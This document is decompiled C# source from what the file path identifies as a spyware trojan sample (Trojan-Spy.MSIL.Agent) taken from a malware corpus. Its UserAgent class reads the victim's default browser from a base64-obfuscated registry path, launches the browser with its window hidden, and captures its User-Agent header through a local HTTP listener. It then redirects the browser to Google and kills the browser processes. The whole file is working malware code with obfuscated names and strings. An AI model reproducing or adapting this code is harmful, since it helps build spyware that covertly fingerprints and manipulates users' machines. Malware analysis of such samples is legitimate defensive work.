// Decompiled with JetBrains decompiler
// Type: rohitry.UserAgent
// Assembly: Xobntom2, Version=1.0.0.422, Culture=neutral, PublicKeyToken=null
// MVID: 7E933326-C6DC-4B1B-B81C-CFA3C6FCABF5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.MSIL.Agent.gen-bbc8ac47d3051fbab328d4a8a4c1c8819707ac045ab6ac94b1997dac59be2ece.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace rohitry
{
  internal class UserAgent
  {
    private static string FREWent;

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(int hWnd, int nCmdShow);

    private static string GetProcessExecutablePath(Process process)
    {
      try
      {
        return process.MainModule.FileName;
      }
      catch
      {
        foreach (ManagementObject managementObject in new ManagementObjectSearcher("SELECT ExecutablePath, ProcessID FROM Win32_Process").Get())
        {
          object obj1 = managementObject["ProcessID"];
          object obj2 = managementObject["ExecutablePath"];
          if (obj2 != null && obj1.ToString() == process.Id.ToString())
            return obj2.ToString();
        }
      }
      return "";
    }

    private static string alisakisas(string pivetondh) => Encoding.ASCII.GetString(Convert.FromBase64String(pivetondh));

    public static string GetHrenvPopyowser()
    {
      string name = UserAgent.alisakisas("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcU2hlbGxcQXNzb2NpYXRpb25zXFVybEFzc29jaWF0aW9uc1xodHRwXFVzZXJDaG9pY2U=");
      using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name))
      {
        if (registryKey == null)
          return (string) null;
        object obj = registryKey.GetValue("Progid");
        if (obj == null)
          return (string) null;
        string lower = obj.ToString().ToLower();
        foreach (KeyValuePair<string, string> keyValuePair in new Dictionary<string, string>()
        {
          {
            "chromehtml",
            "chrome"
          },
          {
            "firefoxurl",
            "firefox"
          },
          {
            "operastable",
            "opera"
          },
          {
            "msedgehtm",
            "msedge"
          }
        })
        {
          if (lower.Contains(keyValuePair.Key))
            return keyValuePair.Value;
        }
        return "iexplore";
      }
    }

    public static string GetBrLocation(string BrowserProcessName)
    {
      Process[] processesByName1 = Process.GetProcessesByName(BrowserProcessName);
      if (processesByName1.Length != 0)
        return UserAgent.GetProcessExecutablePath(processesByName1[0]);
      Process process1 = Process.Start(BrowserProcessName);
      UserAgent.ShowWindow(process1.MainWindowHandle.ToInt32(), 0);
      Thread.Sleep(500);
      string processExecutablePath = UserAgent.GetProcessExecutablePath(process1);
      if (!process1.HasExited)
      {
        process1.Kill();
      }
      else
      {
        Process[] processesByName2 = Process.GetProcessesByName(BrowserProcessName);
        processExecutablePath = UserAgent.GetProcessExecutablePath(processesByName2[0]);
        foreach (Process process2 in processesByName2)
        {
          if (!process2.HasExited)
            process2.Kill();
        }
      }
      return processExecutablePath;
    }

    private static void AwaitUA(string BrowserProcessName, string url)
    {
      long ticks = DateTime.Now.Ticks;
      Process process = Process.Start(BrowserProcessName, url);
      UserAgent.ShowWindow(process.MainWindowHandle.ToInt32(), 0);
      while (UserAgent.FREWent == null && new TimeSpan(checked (DateTime.Now.Ticks - ticks)).TotalSeconds < 60.0)
        Thread.Sleep(100);
      if (process.HasExited)
        return;
      process.Kill();
    }

    public static string BrowserVersion(string BrowserLocation) => BrowserLocation == null ? "0.0" : FileVersionInfo.GetVersionInfo(BrowserLocation.ToString()).FileVersion;

    public static string GetUserAgent(string BrowserProcessName)
    {
      try
      {
        int port = new Random().Next(12000, 14500);
        UserAgent.StartServer(port);
        UserAgent.AwaitUA(BrowserProcessName, string.Format("http://127.0.0.1:{0}", (object) port));
        long ticks = DateTime.Now.Ticks;
        while (UserAgent.FREWent == null)
        {
          if (new TimeSpan(checked (DateTime.Now.Ticks - ticks)).TotalSeconds < 60.0)
            Thread.Sleep(100);
          else
            break;
        }
      }
      catch
      {
      }
      return UserAgent.FREWent;
    }

    private static void StartServer(int port)
    {
      string[] strArray = new string[1]
      {
        string.Format("http://127.0.0.1:{0}/", (object) port)
      };
      HttpListener parameter = new HttpListener();
      foreach (string uriPrefix in strArray)
        parameter.Prefixes.Add(uriPrefix);
      parameter.Start();
      new Thread(new ParameterizedThreadStart(UserAgent.Listen)).Start((object) parameter);
    }

    private static void Listen(object listenerObj)
    {
      try
      {
        HttpListener httpListener = listenerObj as HttpListener;
        HttpListenerContext context = httpListener.GetContext();
        UserAgent.FREWent = context.Request.Headers["User-Agent"];
        HttpListenerResponse response = context.Response;
        response.Redirect(UserAgent.alisakisas("aHR0cDovL2dvb2dsZS5jb20v"));
        response.Close();
        httpListener.Stop();
      }
      catch
      {
      }
    }
  }
}
